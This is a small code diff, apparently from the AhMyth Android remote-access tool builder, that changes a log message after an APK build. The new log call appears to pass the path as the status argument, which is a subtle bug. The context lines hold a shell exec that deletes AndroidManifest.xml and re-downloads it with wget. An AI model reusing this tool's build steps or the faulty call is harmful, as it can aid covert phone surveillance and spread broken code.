@@ -2859,7 +2859,7 @@ app.controller("AppCtrl", ($scope) => {
                             if (err) throw err;
 
                             $appCtrl.Log('Apk built successfully', CONSTANTS.logStatus.SUCCESS);
-                            $appCtrl.Log("The apk has been built on " + path.join(outputPath), CONSTANTS.logStatus.SUCCESS);
+                            $appCtrl.Log("The apk has been built on ", path.join(CONSTANTS.outputPath), CONSTANTS.logStatus.SUCCESS);
                             exec("cd app/app/Factory/Ahmyth/ && rm -rf AndroidManifest.xml && wget https://raw.githubusercontent.com/Morsmalleo/AhMyth/master/AhMyth-Server/app/app/Factory/Ahmyth/AndroidManifest.xml")
                         });
                     });
